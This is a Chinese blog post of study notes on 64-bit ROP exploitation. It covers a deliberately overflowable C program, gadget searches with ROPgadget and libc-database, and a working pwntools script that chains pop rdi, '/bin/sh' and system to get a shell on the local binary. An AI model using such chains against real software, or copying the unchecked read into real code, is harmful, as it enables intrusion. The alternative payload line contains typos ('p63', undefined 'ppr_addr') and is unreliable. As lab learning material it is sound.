---
title: rop64
date: 2018-05-27 21:07:55
tags:
---
学rop之64篇
=======
出自蒸米哥的rop我这里只是理解`http://www.vuln.cn/6644`

源码：
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

void systemaddr()
{
    void* handle = dlopen("libc6_2.27-3ubuntu1_amd64.so", RTLD_LAZY);
    printf("%p\n",dlsym(handle,"system"));
    fflush(stdout);
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    systemaddr();
    write(1, "Hello, World\n", 13);
    vulnerable_function();
}
```
编译：
```
gcc -fno-stack-protector level4.c -o level4 -ldl
```
这里只开启可NX保护。
64位和32位一个很大的区别是64位是用寄存器传参的。现在已经有system函数的地址了，接下来只需要传入参数/bin/sh就行了。
/bin/sh可以直接输入也可以搜索到。不过重要的是需要用一个pop rdi来传参。
我们需要赵的是pop rdi; ret;或者是pop rax;pop rdi;call rax;
这一类的都能满足要求。
![image0005](rop_64/image0005.png)
可以看出来pop rdi是满足不了的(并没有搜索到)。
 那就只能试一下第二个行不行了
 ![image0006](rop_64/image0006.png)
 很遗憾的发现也没有那就只能试试libc.so.6中有没有了。
 补充一下缺少dll连接库可以用database工具来查找

```
liu@liu-F117-F:~/softword/tools/libc-database-master/libc-database-master$ ./find system 0x7f2eea1d4440
http://ftp.osuosl.org/pub/ubuntu/pool/main/g/glibc/libc6_2.27-3ubuntu1_amd64.deb (id libc6_2.27-3ubuntu1_amd64)

```
这样就找到了
```
liu@liu-F117-F:~/桌面$ ROPgadget --binary libc6_2.27-3ubuntu1_amd64.so --only "pop|ret"|grep rdi
0x00000000000221a3 : pop rdi ; pop rbp ; ret
0x000000000002155f : pop rdi ; ret
0x000000000005b4fd : pop rdi ; ret 0x38
```
```
from pwn import *
libc=ELF("libc6_2.27-3ubuntu1_amd64.so")
p=process("./level4")
elf=ELF("level4")
system_addr=int(p.recvuntil('\n'),16)
print "bin_sh_addr="+hex(system_addr)

libc_system_offset=libc.symbols["system"]
bin_sh_addr=system_addr-libc_system_offset+next(libc.search('/bin/sh'))
print "bin_sh_addr="+hex(bin_sh_addr)

libc_pr_offset=0x000000000002155f
pr_addr=system_addr-libc_system_offset+libc_pr_offset
print "pr_addr="+hex(pr_addr)
p.recvuntil("ld")
payload='\x00'*136+p64(pr_addr)+p64(bin_sh_addr)+p64(system_addr)

p.send(payload)
p.interactive()
```
payload='\x00'*136+p64(pr_addr)+p64(bin_sh_addr)+p64(system_addr)
程序中也能查到
```
liu@liu-F117-F:~/桌面$ ROPgadget --binary libc6_2.27-3ubuntu1_amd64.so --only "pop|pop|pop|call"|grep rdi
0x00000000001be293 : call qword ptr [rax + rdi*2 - 0x4c0000]
0x00000000001b017f : call qword ptr [rdi]
0x000000000002529a : call rdi
0x000000000012188b : pop rax ; pop rdi ; call rax
0x000000000012188c : pop rdi ; call rax
```
我们也可以构造payload='A'*136+p64(ppr_addr)+p63(1)+p64(bin_sh_addr)+p64(system_addr)
****
我们找到一条gadget真的不容易，那么能不能找到一条通用的gadget呢
那就看下一篇吧





 